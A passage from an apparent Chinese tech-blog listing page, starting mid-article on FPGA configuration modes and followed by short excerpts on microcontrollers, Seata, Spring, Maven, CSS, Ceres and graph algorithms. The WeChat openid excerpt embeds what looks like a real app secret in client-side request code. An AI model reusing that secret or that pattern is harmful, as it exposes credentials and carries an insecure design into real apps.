当初始化完成以后，器件上漏极开始输出的INIT_DONE管脚被释放，同时被外部的上拉电阻拉高。这时，FPGA完全进入用户模式，所有的内部逻辑以及I/O都按照用户的设计运行，这时，那些FPGA配置过程中的I/O弱上拉将不复存在。不过，还有一些器件在用户模式下I/O也有可编程的弱上拉电阻。在完成配置以后，DCLK信号和DATA管脚不应该被浮空（floating）,而应该被拉成固定电平，高或低都可以。 4.FPGA配置模式选择 用户可以通过设置FPGA上的MSEL0、MESL1两个引脚的状态来选择配置方式。各种方式的MSEL0、MESL1设置如下表所列：
说明：
在上表中，如果只采用一种配置方式，则可以直接将MSEL0、MESL1连接到VCC（注意要与FPGA的IO口的供电VCCIO相同）或GND；
如果需要多种配置方式，那么MSEL要用控制器（单片机、CPLD等）来控制以进行切换；
MSEL管脚在配置开始前必须处于一个固定的状态，因此不能将MSEL管脚悬空。
5.主动串行配置 主动串行配置方式(AS)是将配置数据事先存储在串行配置器件EPCS中,然后在系统上电时Cyclone IV FPGA通过串行接口读取配置数据（如果是压缩数据，还会进行解压缩处理）对内部的SRAM单元进行配置。
因为上述配置过程中FPGA控制配置接口，因此通常称为主动配置方式。在配置期间，Cyclone IV用过串行接口来读配置数据，来对里面的SRAM编程。串行配置器件的四个接口包括，串行时钟输入DCLK，串行数据输出DATA，低有效的片选信号NCE，串行数据输入ASDI。
主动串行配置电路图：
因为FPGA上的nSTATUS、CONFIG_DONE管脚都是开漏结构，所以都要接上拉电阻。FPGA的片选脚nCE必须接地。
6.JTAG配置 通过JTAG接口，利用Quartus II软件可以直接对FPGA进行单独的硬件重新配置。Quartus II软件在编译时会自动生成用于JTAG配置的.sof文件。
如果同时使用AS方式和JTAG方式来配置FPGA，JTAG配置方式拥有最高的优先级，此时AS方式将停止，而执行JTAG方式配置。
利用Quartus II软件和USB Blaster等下载电缆可下载配置数据到FPGA。Quartus II软件可以验证JTAG配置是否成功。JTAG配置通过下载电缆使用SOF、Jam或者JBC文件直接对FPGA进行配置，这种配置方式只能用于调试阶段，因为，掉电后FPGA中的配置数据将丢失。
7.被动串行配置 被动串行PS配置方式是Altera Cyclone IV系列FPGA配置方式中比较常用的方式。但是，在工程应用中若采用这种配置方式，FPGA需要连接一个智能主机（比如复杂可编程逻辑器件CPLD/微控制单元MCU等）以给其提供配置时钟和配置数据。
在该配置方式下，智能主机在保证与存储配置数据的闪存通信无误的情况下，只需向FPGA提供一个DCLK信号和一个DATA0信号即可实现对FPGA的配置。另外，该DCLK信号还可以实现多种频率以满足用户对配置时间的需求，这是该配置方式的一大亮点。
本文介绍了以Altera型的FPGA芯片为例介绍了FPGA的上电过程，并描述了三种常见的配置模式，用户可以根据不同的需求来采用对应的配置模式，每种配置模式下对应的配置数据类型也是不相同的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7eea5d0c76e8a024aa061b7ed586b32/" rel="bookmark">
			L1-056 猜数字（20分）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一群人坐在一起，每人猜一个 100 以内的数，谁的数字最接近大家平均数的一半就赢。本题就要求你找出其中的赢家。
输入格式： 输入在第一行给出一个正整数N（≤104）。随后 N 行，每行给出一个玩家的名字（由不超过8个英文字母组成的字符串）和其猜的正整数（≤ 100）。
输出格式： 在一行中顺序输出：大家平均数的一半（只输出整数部分）、赢家的名字，其间以空格分隔。题目保证赢家是唯一的。
输入样例： 7 Bob 35 Amy 28 James 98 Alice 11 Jack 45 Smith 33 Chris 62 输出样例： 22 Amy 思路方法：结构数组，同时需要注意的是在每个结构体对象中，定义一个变量用于记录他们才出的数字和1/2平均数之间的差值，便于比较。
如果用指针结构数组，也可以书写比较阶段。
代码如下：
#include &lt;iostream&gt; #include &lt;cmath&gt; using namespace std; struct person { string name; int num;//猜出的数字 double sub;//猜出的数字num 和1/2倍平均数的差值的绝对值 }; int main() { int n; cin&gt;&gt;n; int sum=0; person x[n]; //输入数据 for(int i=0;i&lt;n;i++) { x[i].sub=0;//差值初始化 cin&gt;&gt;x[i].name&gt;&gt;x[i].num; sum+=x[i].num; } cout&lt;&lt;sum/n/2&lt;&lt;" "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a7eea5d0c76e8a024aa061b7ed586b32/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/948d9328bfab11eb6edc96324fd9d6ff/" rel="bookmark">
			关于51单片机的地址空间溢出以及解决方法的个人看法(proteus无法仿真)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人看法，不喜勿喷
在51单片机程序编写中，当变量过多而且数据类型过大的话，容易在编译的时候出现以下的问题，具体表现为：
*** ERROR L107: ADDRESS SPACE OVERFLOW SPACE: DATA SEGMENT: _DATA_GROUP_ LENGTH: 0019H Program Size: data=130.0 xdata=7 code=3267
Target not created.
这样子也就是所谓的编译失败，不能生成HEX文件，更加无法烧写到程序中去，那么如何解决这个问题呢，我在网上找到了解法，网上的具体步骤如下：
1.先点击这个图标
2.在其中的memory model 将small改成compact选项，那么即可编译通过。
3.确实，我通过这种方法，解决了程序无法编译的问题
但是呢，我们将这种情况下生成的HEX文件在proteus上面导入，准备实现整体软件的功能，这个时候我们又会发现一个问题，那就是Proteus里面的程序运行不了
我们观察这个LCD１６０２的显示屏，发现上面是直接的黑块，这个就很奇怪了。。。我以为是LCD初始化做的不够，就去疯狂的调试LCD的程序。。。。。后来发现不是LCD的程序问题，而是你改成了了Compact模式之后还要紧接着修改RAM的地址.
像我这种菜鸡怎么会修改RAM的地址呢???我就想了另外一种解决方法.
就是在变量的数据类型上面进行修改,因为我们程序中一定会用到大量的全局变量跟局部变量,那么将变量的类型修改成为xdata类型就可以了.
例如
unsigned int xdata Count1;
unsigned int xdata Count2;
unsigned int xdata jll;
我们也不需要将所有的变量都设置成为这种类型,只要合适就好.
再将Compact类型改成small类型,之后重新编译就可以通过.
注意我们还需要在Proteus里面修改内容哦,所需要修改的是STC89C52.
右键52单片机,点击编辑属性,找到最下面一栏
然后修改XRAM的内容
将XRAM的值改成512
之后重新加载hex文件就可以出结果了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/620a8753db36d9e8557faf7aa5777191/" rel="bookmark">
			51单片机DS18B20温度传感器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DS18B20 介绍 DS18B20是一种常见的数字温度传感器，其控制命令和数据都是以数字信号的方式输入输出，相比较于模拟温度传感器，具有功能强大、硬件简单、易扩展、抗干扰性强等特点，其测温范围大约在-55°C 到 +125°C之间，它的通信接口是1-Wire（单总线），其它特征有可形成总线结构、内置温度报警功能、可寄生供电（可寄生供电即无需接VCC，只需要接数据线与GND即可完成数据通信，节省线路）
关于温度的测量，我们可以用温度传感器或者数字温度传感器，但是数字温度传感器总体会比温度传感器的精度要高一些。
本单片机的DS18B20无需设计电路，只需要通过引脚与单总线通信协议，将RAM里面的温度转化读取出来即可，因此我就不在说明里面的电路构造了
存储器 TEMPERATURE SENSOR（温度传感器）相当于内部的模拟传感器集成部分。
当发出指令让其开始温度转换时，该部分就开始工作，并将数据放入RAM中。
ALARM HIGH TRIGGER REGISTER（TH，报警高触发器）用于存储温度上限阈值，实现温度报警。
存储介质为EEPROM，掉电不丢失数据。
ALARM LOW TRIGGER REGISTER（TL，报警低触发器）用于存储温度下限阈值，实现温度报警。
存储介质为EEPROM，掉电不丢失数据。
CONFIGURATION REGISTER（配置寄存器）用于设置分辨率（精度）
——这里出厂默认最高精度为0.0625℃。
可以通过配置寄存器中两位（其他位无效）来降低精度，最低为0.5℃。
当精度降低时，温度转换速率会迅速提升。（相当于处理的数据少了，流程简化，速度就上去了）
存储介质为EEPROM，掉电不丢失数据。
8-BIT CRC GENERATOR（8位CRC生成器）中CRC为校验码，该部分将RAM之前的数据进行校验，并生成一个校验码放于后端，通讯时检测即可判断数据是否正确。（CRC为校正率较高的一种校验码）
温度存储部分：
Byte 0存储的是温度的最低有效字节，括号内为默认值。
Byte1存储的是温度的最高有效字节，括号内为默认值。
两个字节共同组成温度值，在未变动情况下，默认值为85℃。（不同单片机默认值不一样）
配置温度数据部分：
Byte 2存储为温度上限阈值，Byte 3存储为温度下限阈值，Byte 4存储为精度（分辨率）。
右边的EEPROM负责存储数据，需要读取与写入数据要先经过RAM部分，然后通过指令将数据存储进EEPROM中（当上电时，EEPROM的数据会自动放入RAM中）
Byte 5~Byte 7为保留部分，说白了，就是没有任何用处，只不过为了以后的功能添加而预留的位置。
CRC校验部分：
将前面八个字节进行运算，并生成CRC校验码。
可以读取CRC校验码，并对前面八个字节数据进行运算，如果运算结果与CRC相同，那么校验正确，反之数据出错。
单总线时序结构 初始化 由于这是单总线，所以数据传送的时间一定要严格
图中黑粗线Bus master pulling low（主机拉低）是将总线拉低；而图中黑细线Resistor pullup为上拉电阻将总线上拉（因为是弱上拉，所以利用曲线来表示弱的状态，而不是强上拉一下拉上去）
当从机存在时，从机会将总线拉低（即图中棕线DS18B20 pulling low）。最终上拉电阻拉高，总线恢复空闲状态。由于中间的操作间隔时间是范围值，没有确切的参考数据，于是取中间值来作为等待间隔时间，对于以上的操作，可以将过程分为复位与响应两个部分
发送一位 我们可以将上面的部分分为发送0与发送1两部分的时序。换句话说，就是通过时间的不同来区分数据是输入1还是0.
发送0时，拉低超过60us且不能超过120us，否则如果超过120us时，可能会变为初始化操作（至少480us），两个数据发送中间存在总线恢复时间，因此连续发送两位不能低于这个恢复时间。
图中阴影部分，表示可以在1~15us时释放总线即可，这时电阻都会将总线拉高。
从机在主线拉低30us后进行操作（如果发送0，就一直保持总线拉低；如果发送1，就在主线拉低后，将总线释放），这样就可以很清楚的确认要发送的数据了。若在主线拉低15us后进行操作，就有可能会出现一些数据传输的偏差，因为发送1的时序在15us时，正处于主线拉高的状态，我们无法准确的判断此时是否已经完成拉高的操作，因此在30us后进行最合适。
接收一位 当主机拉低总线后，从机如果需要发0，那么也拉低总线，当主机在1~15us后释放总线时，因为从机拉低着，因此总线状态为拉低状态。
当主机拉低总线后，从机如果需要发1，那么就不动总线。当主机经过1~15us后释放总线时，因为没有被拉低，因此总线状态为拉高状态。在总机拉低后15us内读取总线电平（I/O口），即可知道从机需要发送的数据。
发送与接收一个字节 DS18B20操作 首先，我们需要将DS18B20进行初始化，让从机复位，主机判断从机是否响应
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/620a8753db36d9e8557faf7aa5777191/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/968d0298b00b14ff655b7dea171d442b/" rel="bookmark">
			Seata使用教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、Seata简介1.Seata 概念介绍2.分布式事务3.Seata核心组件4.Seata 工作流程5.Seata四大模式二、Seata实战教程1.下载资源2.配置Seata-Server3.增加相关表结构4.代码配置三、常见报错解决 一、Seata简介 1.Seata 概念介绍 Seata 是一款阿里巴巴开源的分布式事务解决方案，致力于提供高性能和简单易用的分布式事务服务。
官方文档地址 http://seata.io/zh-cn/docs/overview/what-is-seata.html
2.分布式事务 我们可以将分布式事务理解成一个包含了若干个分支事务的全局事务。全局事务的职责是协调其管辖的各个分支事务达成一致，要么一起成功提交，要么一起失败回滚。通常分支事务本身就是一个满足 ACID 特性的本地事务。
分布式事务主要涉及以下概念：
事务：由一组操作构成的可靠、独立的工作单元，事务具备 ACID 的特性，即原子性、一致性、隔离性和持久性。
本地事务：本地事务由本地资源管理器（例如 MySQL、Oracle 等）管理，严格地支持 ACID 特性，高效可靠。本地事务不具备分布式事务的处理能力，只能对自己数据库的操作进行控制，对于其他数据库的操作则无能为力。
全局事务：全局事务指的是一次性操作多个资源管理器完成的事务，由一组分支事务组成。
分支事务：在分布式事务中，就是一个个受全局事务管辖和协调的本地事务。
3.Seata核心组件 (1)TC（Transaction Coordinator）：事务协调器，它是事务的协调者（这里指的是 Seata 服务器），主要负责维护全局事务和分支事务的状态，驱动全局事务提交或回滚。
(2)TM（Transaction Manager）：事务管理器，它是事务的发起者，负责定义全局事务的范围，并根据 TC 维护的全局事务和分支事务状态，做出开始事务、提交事务、回滚事务的决议。
(3)RM（Resource Manager）：资源管理器，它是资源的管理者（这里可以将其理解为各服务使用的数据库）。它负责管理分支事务上的资源，向 TC 注册分支事务，汇报分支事务状态，驱动分支事务的提交或回滚。
4.Seata 工作流程 Seata 对分布式事务的协调和控制，主要是通过 XID 和 3 个核心组件实现的。
XID:是全局事务的唯一标识，它可以在服务的调用链路中传递，绑定到服务的事务上下文中
工作流程：
(1)TM 向 TC 申请开启一个全局事务，全局事务创建成功后，TC 会针对这个全局事务生成一个全局唯一的 XID；
(2)XID 通过服务的调用链传递到其他服务;
(3)RM 向 TC 注册一个分支事务，并将其纳入 XID 对应全局事务的管辖；
(4)TM 根据 TC 收集的各个分支事务的执行结果，向 TC 发起全局事务提交或回滚决议；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/968d0298b00b14ff655b7dea171d442b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea7ec2b2b0a34adbcb6bc4608f9df35b/" rel="bookmark">
			阿里内部热捧“Spring全线笔记”，不止是全家桶，太完整了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 对于每一位Java开发人员来说，提起Spring定是不陌生的，实际上自Spring框架诞生以来，就备受开发者的青睐，基本上现在的互联网公司都要使用到Spring框架。Spring框架中又包含了SpringMVC、SpringBoot、SpringCloud等，被开发者称呼为Spring全家桶。
实际上对于Spring的使用，阿里巴巴开发者肯定是更有发言权的，今天要分享的则是阿里内部备受热捧的“Spring全线笔记”，不仅仅是全家桶那么简单，看下来直呼：太完整了！
PART1：Spring全线笔记之Spring系列 1.Spring5开发大全
2.全网最深的Spring5源码解读
5分钟快速理解Spring核心流程熟练掌握Spring工作常用注解及陷阱循环依赖及Bean定义解析IOC容器源码解读AOP源码解读声明式事务源码解读手写支持异步事务的开源框架 PART2：Spring全线笔记之Spring Boot系列 1.Spring Boot快速入门
与SpringMVC的区别介绍10分钟SpringBoot快速入门 2.Spring Boot进阶篇
核心组件分析不可思议的性能优化Jta+Atomikos分布式事务 3.Spring Boot底层源码精讲
SpringBoot启动器原理SpringBoot核心源码解读SpringBoot的自动配置原理SpringBoot自动配置源码分析SpringBoot启动流程源码分析SpringBoot中的@Conditional原理自定义功能启动器 4.手写Spring Boot实战
开发第一个应用程序自定义配置测试Groovy与Spring Boot CLI在Spring Boot中使用Grails深入Actuator部署Spring Boot 应用程序Spring Boot开发者工具Spring Boot起步依赖配置属性Spring Boot依赖 PART3：Spring全线笔记之Spring MVC系列 1.Spring MVC开发者手册
2.Spring MVC框架源码解读
嵌入式tomcat启动springmvctomcat的SPI机制加载springmvc容器RequestMappingInfo和HandlerMethod的映射关系建立handlerMapping和HandlerAdapter的关系HandlerlInterceptor的前置、中置、后置过滤器原理HandlerAdapter的参数解析原理springmvc的全局异常处理@ControllerAdvice原理springmvc中cors的js跨域解决方案原理springmvc的调用流程梳理P7必知响应式编程-WebFlux PART4：Spring全线笔记之Spring Cloud Netflix系列 1.SpringCloud参考指南
微服务简介SpringCloud使用Docker构建微服务 2.SpringCloud微服务架构实战
SpringCloud概述搭建开发环境微服务发布与调用负载均衡REST客户端FeignSpringCloud的保护机制微服务集群网关微服务与消息驱动集群配置中心微服务跟踪微服务数据库实战案例实战 PART5：Spring全线笔记之Spring Cloud Alibaba系列 1.基础入门
框架入门及背景介绍框架技术体系讲解20分钟构建一个Spring Cloud Alibaba项目 2.Nacos
Nacos-Discovery服务发现配置中心Nacos-Config 3.SkyWalking
链路跟踪概述客户端/服务端实战Assembly Plugin 4.Sentinel限流
Sentinel熔断器特性Feign集成SentinelSentinel-Dashboard 5.Seata分布式事务
Seata ServerSeata请求逻辑实战分布式事务 PART6：Spring全线笔记之大厂面试真题系列 1.大厂面试真题系列之Spring
问题一：什么是 Spring 框架？Spring 框架有哪些主要模块？问题二：使用 Spring 框架能带来哪些好处？问题三：什么是控制反转(IOC)？什么是依赖注入？问题四：请解释下 Spring 框架中的 IoC？问题五：BeanFactory 和 ApplicationContext 有什么区别？问题六：Spring 有几种配置方式？问题七：如何用基于XML配置的方式配置 Spring？问题八：如何用基于Java配置的方式配置 Spring？问题九：怎样用注解的方式配置Spring？问题十：请解释 Spring Bean 的生命周期？问题十一：Spring Bean 的作用域之间有什么区别？问题十二：什么是 Spring inner beans？问题十三：Spring 框架中的单例 Beans 是线程安全的么？问题十四：请举例说明如何在 Spring 中注入一个 Java Collection？问题十五：如何向 Spring Bean 中注入一个 Java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea7ec2b2b0a34adbcb6bc4608f9df35b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1be57768b790889d7904273f039a046f/" rel="bookmark">
			解决python（pycharm）中运行plt.imshow不出现图片的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用plt.imshow()发现不能显示图片，加了plt.show()也还是不能显示
先引入包pylabimport pylab 然后在plt.imshow(img)后面添加一行代码
pylab.show()
import numpy as np import matplotlib.pyplot as plt import pylab train_set_x_orig, train_set_y, test_set_x_orig, test_set_y, classes = load_dataset() index = 5 plt.imshow(train_set_x_orig[index]) pylab.show() 图片框就显示出来了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/782439e7585c4c2dd68a18924c62b40d/" rel="bookmark">
			el-upload formdata格式上传文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 el-upload formdata格式上传文件 使用场景：上传文件、图片有时候会要求使用formdata格式来上传 代码基于el-upload来讲 (如果有需要后面会写一篇专门讲解el-upload)
&lt;template&gt; &lt;div&gt; &lt;el-upload action="#" :show-file-list="false" slot="prepend" ref="uploadref" :http-request="httpRequest" &gt; &lt;div style="display:flex"&gt; &lt;el-button type="primary" size="small"&gt;选择文件&lt;/el-button&gt; &lt;/div&gt; &lt;/el-upload&gt; &lt;/div&gt; &lt;/template&gt; httpRequest(opt) { let file = opt.file; let name = file.name; let fd = new FormData(); fd.append("file", this.file); //append我们可以理解为set一个属性和值进去（key,value） fd.append("name", name ); let config = { headers: { "Content-Type": "multipart/form-data", //设置请求头 }, }; this.woaicc.upload(fd).then((res) =&gt; { if (res.code === "200") { this.$message({ message: "上传成功",type: "success",}); } }); }, 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/581e4a2a3a49f9e102e5a91935d4380b/" rel="bookmark">
			第三章 其他核心概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：生命周期 1.1作用 为了让构建过程自动化完成， Maven 设定了三个生命周期，生命周期中的每一个环节对应构建过程中的一个操作。 1.2三个生命周期 生命周期名称作用各个环节Clean清理操作相关 pre-clean clean post-clean Site生成站点相关 pre-site site post-site deploy-site Default主要构建过程 validate generate-sources process-sources generate-resources process-resources 复制并处理资源文件，至目标目录，准备打包。 compile 编译项目 main 目录下的源代码。 process-classes generate-test-sources process-test-sources generate-test-resources process-test-resources 复制并处理资源文件，至目标测试目录。 test-compile 编译测试源代码。 process-test-classes test 使用合适的单元测试框架运行测试。这些测试代码不会被打包或部署。 prepare-package package 接受编译好的代码，打包成可发布的格式，如 JAR 。 pre-integration-test integration-test post-integration-test verify install 将包安装至本地仓库，以让其它项目依赖。 deploy 将最终的包复制到远程的仓库， 以让其它开发人员共享；或者部署到服务器上运行（需借助插件，例如：cargo）。 1.3特点 前面三个生命周期彼此是独立的。 在任何一个生命周期内部，执行任何一个具体环节的操作，都是从本周期最初的位置开始执行，直到指定的地方。（本节记住这句话就行了，其他的都不需要记） Maven 之所以这么设计其实就是为了提高构建过程的自动化程度：让使用者只关心最终要干的即可，过程中的各个环节是自动执行的。
2：插件和目标 2.1插件 Maven 的核心程序仅仅负责宏观调度，不做具体工作。具体工作都是由 Maven 插件完成的。例如：编译就是由 maven-compiler-plugin-3.1.jar 插件来执行的。 2.2目标 一个插件可以对应多个目标，而每一个目标都和生命周期中的某一个环节对应。 Default 生命周期中有 compile 和 test-compile 两个和编译相关的环节，这两个环节对应 compile和 test-compile 两个目标，而这两个目标都是由 maven-compiler-plugin-3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/581e4a2a3a49f9e102e5a91935d4380b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/328f218195e7d511da9d1e87df75e6d1/" rel="bookmark">
			在JSON.parse之前判断字符串是否是JSON对象字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 每次使用JSON.parse，如果非JSON格式的会报错，那么可以用下面的方法来提前检测
function isJSON(str) { if (typeof str == 'string') { try { var obj = JSON.parse(str); if(typeof obj == 'object' &amp;&amp; obj ){ return true; }else{ return false; } } catch(e) { return false; } } return false; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97e3cc787b9decd9e53260dd74e9b8ab/" rel="bookmark">
			Sublime text 侧边栏字体大小调整
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Sublime text正常安装完了之后，右边的代码模块的字体是可以通过CTRL+鼠标滑轮去调整大小的，很方便，但是侧边栏的字体不能通过此方法来调整。接下来就为大家介绍一下调整侧边栏字体大小的方法。
1、首先直接打开工具或者直接选择命令面板或者直接按CTRL+SHIFT+P打开搜索列表。
2、打开之后，在搜索框里面搜索PackageResourceViewer，然后选择 Open Resource。
3、 然后搜索Theme-Default，这里视每个人选择的主题为准，你当前用的什么主题，就搜索什么，然后点击进去。
4、 完成上一步之后我们直接搜索Default，会看到如下的两个文件，按照我给的顺序依次打开。
5、在Default dark theme文件里面，按CTRL+F搜索sidebar，在图示地方添加代码，改完后按CTRL+S保存一下。
"font_size":"var(font_size_lg)", 6、打开另外一个文件“Default。sublime-theme”，就会看到前面几行代码，可以都调整一遍，然后就会看到侧边栏的字体变大了，按照自己的喜好调整大小即可，记得修改后记得保存不然不会生效。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a9c29009030a0f5b6fcc0b71a1a5684/" rel="bookmark">
			微信小程序获取用户openid（详解）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小程序可以通过微信官方提供的登录能力方便地获取微信提供的用户身份标识快速建立小程序内的用户体系
然而因为小程序中的openid不可以直接使用需要用code（登录凭证）去换取openid
获取openid的思路 获取openid首先需要调用小程序的login方法获取小程序的登录凭证code,然后使用code向微信换取登录态信息,包括用户的唯一标识(openid)及本次登录的会话密钥(session_key)
我这里是用一个点击事件来触发一个函数
wx.getUserInfo 会获取到你的一些信息 比如名字
info(){ wx.getUserInfo({ //成功后会返回 success:(res)=&gt;{ console.log(res); } }) }, 打印结果
wx.login 可以获取到你的code值
wx.login({ //成功放回 success:(res)=&gt;{ console.log(res); let code=res.code } }) 打印结果
通过wx.request 来让code换取openid
这个地址可以在开发文档=&gt;服务器=&gt;登录中 找到
这段链接中有三处地方需要改动
（每个人的id都不一样所以你要自己去作修改 下面有修改处的位置）
wx.request({ url: `https://api.weixin.qq.com/sns/jscode2session?appid=wx16ccbe7d04209a11&amp;secret=1f9465bdebe244b5ad15635e8a655832&amp;js_code=${code}&amp;grant_type=authorization_code`, success:(res)=&gt;{ console.log(res); userInfo.openid=res.data.openid //获取到你的openid console.log(userInfo.openid); } }) 第一个
登录 微信公众平台 =&gt;开发管理=&gt;开发设置=&gt;开发者Id
第二个
在第一个的下面
当前微信开发者工具的appid一定要与填写链接的id保持一致
第三个是你获取的code值
把他拼接过去 注意要使用反引号
第四步还需要将小程序开发者工具中的不校验https合法域名给勾选上
然后打印你就会看到你的openid的值 如下
以下是全部代码（在全局获取，哪个组件需要直接调用）
var global = getApp() var openid =global.globalData.open wx.request({ url: 'https://sad', //仅为示例，并非真实的接口地址 data: { money:that.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a9c29009030a0f5b6fcc0b71a1a5684/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f32b9593723bf5a448f139bc31cefe02/" rel="bookmark">
			css文本字符的间距、标签单词之间的空格长度、元素行盒（line boxes）的最小高度、块元素首行文本内容之前的缩进量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		letter-spacing CSS 的 letter-spacing 属性用于设置文本字符的间距表现。在渲染文本时添加到字符之间的自然间距中。letter-spacing 的正值会导致字符分布得更远，而 letter-spacing 的负值会使字符更接近。
word-spacing CSS 属性 word-spacing 设置标签、单词之间的空格长度。
line-height line-height CSS 属性用于设置多行元素的空间量，如多行文本的间距。对于块级元素，它指定元素行盒（line boxes）的最小高度。对于非替代的 inline 元素，它用于计算行盒（line box）的高度。
text-indent text-indent 属性能定义一个块元素首行文本内容之前的缩进量。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82d8d83efcb309bd5cffa6c58f0b0b95/" rel="bookmark">
			Ceres学习笔记建模篇001_代价函数基类CostFunction及其派生类SizedCostFunction介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ceres主要由两大部分组成：
建模API：Ceres提供了一组丰富的工具来构造（最小二乘）优化问题；求解器API：Ceres提供最小化算法来求解优化问题； 本篇主要介绍如何使用Ceres构造非线性优化问题，即建模。
Ceres解决的是具有边界约束的非线性最小二乘鲁棒优化问题，形式如下：
min x 1 2 ∑ i ρ i ( ∥ f i ( x i 1 , ⋯ , x i k ) ∥ 2 ) , l j ≤ x j ≤ u j \underset{x}{\text{min}} \frac{1}{2}\sum_i\rho_i (\parallel f_i(x_{i1},\cdots,x_{ik})\parallel^2),\; l_j\leq x_j\leq u_j xmin​21​∑i​ρi​(∥fi​(xi1​,⋯,xik​)∥2),lj​≤xj​≤uj​ （1） ( x i 1 , ⋯ , x i k ) (x_{i1},\cdots,x_{ik}) (xi1​,⋯,xik​)在Ceres中被称为参数块（ParameterBlock），通常是几组标量的集合，例如，相机的位姿可以定义成是一组包含3个参数的平移向量（用于描述相机的位置），和包含4个参数的四元数（用于描述相机姿态），当然，参数块也可以只有一个参数， l j l_j lj​和 u j u_j uj​是参数块中对应每个参数的边界； f i ( ⋅ ) f_i(\cdot) fi​(⋅)在Ceres中被称为代价函数（CostFuntion），是关于参数块的函数，在一个优化问题中，可能会存在多个代价函数； ρ i ( ⋅ ) \rho_i(\cdot) ρi​(⋅)在Ceres中被称为损失函数（LossFuntion），是一个标量函数，将代价函数计算出的值映射到另一个区间中的值，用于减少异常值或外点（outliers）对非线性最小二乘优化问题的影响，作用有点类似于机器学习中的激活函数，例如，直线拟合时，对于距离直线非常远的点，应当减少它的权重，损失函数并非是必须的，可以为空（NULL），此时，损失函数值等同于代价函数计算值，即 ρ i ( t ) = t \rho_i(t)=t ρi​(t)=t； 当损失函数为空，且参数没有边界时，就是我们熟悉的非线性最小二乘问题，如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/82d8d83efcb309bd5cffa6c58f0b0b95/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa5bf13a7bc92126bdcb5e6e8033ea4e/" rel="bookmark">
			C&#43;&#43;图论 最短路问题总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
最短路问题
图的存储 一、单源最短路
① 朴素Dijkstra O(n^2)
练习题
代码 ② 堆优化Dijkstra O(mlogn)
练习题
代码
③ Bellman_ford O(nm)
练习题
代码
④ Spfa O(n) - O(nm)
练习题
​代码
二、多源最短路
Floyd O(n^3)
练习题
代码
最短路问题 图的存储 稠密图(边数很大，点数很少)用邻接矩阵存储，邻接矩阵即开辟一个二维数组，g[a][b]代表a到b有一条边
稀疏图(边数与点数差不多)用邻接表存储，邻接表为链表数组，代码如下：
const int N = 1e5+5; int h[N], e[N], ne[N], idx; 一、单源最短路 单源指的是只能从一个结点出发
① 朴素Dijkstra O(n^2) 稠密图(邻接矩阵存储)常用：此时点数较小，n*n不会超时间限制,时间复杂度为
步骤：
初始化距离数组和邻接矩阵，dist[1] = 0，dist[i] = 0x3f3f3f3f，g[i] [j] = 0x3f3f3f3f
for外循环n(或者n-1)次遍历，再一层for循环遍历距离数组获取不在S数组里的离源点最短的点t
用t更新其他的点，把t加到S集合中
练习题 给定一个 n 个点 m 条边的有向图，图中可能存在重边和自环，所有边权均为正值。
请你求出 1 号点到 n 号点的最短距离，如果无法从 1 号点走到 n 号点，则输出 −1。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa5bf13a7bc92126bdcb5e6e8033ea4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e80c5ae85186dfdb1112b7dc0133fbe/" rel="bookmark">
			在centos 7.4上使用jexus 部署 asp.net core 项目
			</a>
		</h2>
		
	</header>
